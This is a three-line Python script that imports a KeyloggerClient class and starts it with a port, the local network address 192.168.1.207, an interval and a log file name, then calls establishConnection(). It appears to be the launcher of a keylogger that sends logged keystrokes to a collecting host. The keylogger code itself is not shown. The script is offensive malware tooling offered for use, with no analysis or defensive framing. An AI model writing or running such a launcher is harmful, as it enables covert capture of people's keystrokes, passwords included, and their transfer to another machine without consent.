from keylogger_client import KeyloggerClient


call = KeyloggerClient(5000, "192.168.1.207", 10, "log.txt")
call.establishConnection()